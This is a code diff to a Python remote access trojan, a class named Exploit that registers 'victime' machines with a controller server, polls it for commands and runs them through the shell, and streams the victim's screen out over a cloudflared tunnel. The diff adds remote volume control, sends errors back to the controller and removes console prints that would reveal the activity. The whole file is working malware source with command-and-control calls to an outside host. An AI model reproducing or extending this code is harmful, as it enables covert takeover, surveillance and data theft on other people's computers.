@@ -1,20 +1,59 @@
 from netpwner import NetworkPwner
+from server import app
+from mss import mss
 from stream import *
 import subprocess
 import socket
 import webbrowser
 import threading
 import pyperclip
+import os
+os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
 import pygame
 import pyautogui
 import requests
 import platform
 import time
 import sys
-import os
 import re
 import io
 
+class VolumeController:
+    def __init__(self):
+        self.system = platform.system()
+
+        if self.system == "Windows":
+            from ctypes import cast, POINTER
+            from comtypes import CLSCTX_ALL
+            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+
+            self.devices = AudioUtilities.GetSpeakers()
+            self.interface = self.devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+            self.volume_control = cast(self.interface, POINTER(IAudioEndpointVolume))
+
+        elif self.system in ["Linux", "Darwin"]:  # macOS/Linux
+            import pulsectl
+            self.pulse = pulsectl.Pulse('volume-controller')
+
+    def get_volume(self) -> int:
+        """Returns the current volume percentage (0-100)."""
+        if self.system == "Windows":
+            return int(self.volume_control.GetMasterVolumeLevelScalar() * 100)
+        elif self.system in ["Linux", "Darwin"]:
+            default_sink = self.pulse.sink_list()[0]  # Get the default audio output device
+            return int(default_sink.volume.value_flat * 100)
+        return None
+
+    def set_volume(self, volume):
+        volume = int(volume)
+        """Sets the system volume to the given percentage (0-100)."""
+        volume = max(0, min(volume, 100))  # Ensure volume stays within range
+
+        if self.system == "Windows":
+            self.volume_control.SetMasterVolumeLevelScalar(volume / 100, None)
+        elif self.system in ["Linux", "Darwin"]:
+            default_sink = self.pulse.sink_list()[0]
+            self.pulse.volume_set_all_chans(default_sink, volume / 100)
 
 class Exploit:
     def __init__(self):
@@ -26,6 +65,7 @@ class Exploit:
         self.T = True
         self.mixer = pygame.mixer
         self.tunnel_process = None
+        self.vc = VolumeController()
         self.register()
 
     def launch_cloudflared_tunnel(self,port):
@@ -55,11 +95,10 @@ class Exploit:
 
     def start_local_server(self):
         def run_server():
-            subprocess.run(f'python pwn/manage.py runserver {self.ip}:8000', shell=True)
+            app.run(host='0.0.0.0',port=8000)
         
         self.server_thread = threading.Thread(target=run_server)
         self.server_thread.start()
-        print("Django server started")
     
 
     def stop_tunnel(self):
@@ -71,11 +110,11 @@ class Exploit:
         else:
             return "No tunnel is running."
 
-    def get_os_name(self):
+    def get_os_name(self) -> str:
         os_name = platform.system()+platform.release()
         return os_name
 
-    def stop_screen_share(self):
+    def stop_screen_share(self) -> str:
         self.T = False
         return f"stream stopped on {self.target}"
 
@@ -85,7 +124,15 @@ class Exploit:
         with mss() as sct:
             monitor = sct.monitors[1]
             while self.T:
-                stream_screen(sct,monitor,f'http://{self.ip}:8000/api/upload_stream/',self.target,0.02)
+                try:
+                    stream_screen(sct,monitor,f'http://0.0.0.0:8000/upload_stream/',self.target,0.06)
+                except Exception as e:
+                    requests.post(f'{self.url}/api/log/',json={
+                        'target': self.target,
+                        'log': e,
+                        'command': "stream error",
+                    })
+                    return
     
     def hundle_command(self, command):
         if command.startswith("cd"):
@@ -126,14 +173,26 @@ class Exploit:
             url = self.launch_cloudflared_tunnel(8000)
             t1 = threading.Thread(target=self.share_screen)
             t1.start()
-            exc =f"stream started by {self.target} at {url}/api/stream/{self.target}/"
+            exc =f"stream started by {self.target} at {url}/stream/{self.target}/"
 
         elif command in ['stop screenshare',"stop stream"]:
             exc = self.stop_screen_share()
+        elif command == '$volume':
+            vl = self.vc.get_volume()
+            exc =f"the volume : {vl}"
+
+        elif command.startswith('$volume '):
+            vl = self.clean_message("$volume",command)
+            cvl = self.vc.get_volume()
+            if not vl.isnumeric():
+                return f"{vl} : is not a number"
+            if len(vl) > 3 or len(vl) == 0:
+                return f"{vl} : is not a number between 0 and 100"
+            self.vc.set_volume(vl)
+            exc =f"the volume changed from {cvl} --> {self.vc.get_volume()}"
         else: 
             exc = subprocess.run(command, shell=True,capture_output=True,text=True).stdout
         return exc
-    
     
     def reverce_http(self):
         commands = requests.get(f'{self.url}/api/commands/?target={self.target}').json()
@@ -141,7 +200,6 @@ class Exploit:
         if type(commands) == list:
             for cm in commands:
                 command = cm["command"]
-                print(command+' recived')
                 try:
                     exc = self.hundle_command(command)
                 except Exception as e:
@@ -180,7 +238,7 @@ class Exploit:
         requests.delete(f'{self.url}/api/victime/?name={self.target}')
         requests.post(f'{self.url}/api/states/',json={"target":self.target,"state":"Disconnected"})
 
-    def clean_message(self,keyword,word):
+    def clean_message(self,keyword,word) -> str:
         word = word.split(keyword,1)[1][1:]
         return word
 
